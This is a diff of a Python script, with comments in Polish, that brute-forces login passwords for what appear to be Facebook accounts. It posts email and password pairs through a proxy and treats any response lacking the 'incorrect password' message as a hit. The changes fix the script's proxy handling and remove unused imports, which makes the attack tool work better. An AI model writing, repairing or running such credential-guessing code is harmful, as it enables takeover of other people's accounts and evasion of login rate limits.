@@ -1,6 +1,4 @@
 import requests
-import time
-import random
 from bcrypt import checkpw
 
 def verify_password(password, hashed_password):
@@ -17,7 +15,7 @@ def brute_force(username, fb_id, passwords, proxy):
             'email': username,
             'password': password,
             'login': 'Log In'
-        }, proxies={'http': proxy, 'https': proxy})
+        }, proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'})
 
         # Sprawdź odpowiedź
         if "Nieprawidłowe hasło" not in response.text:
@@ -47,8 +45,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
 
 
 
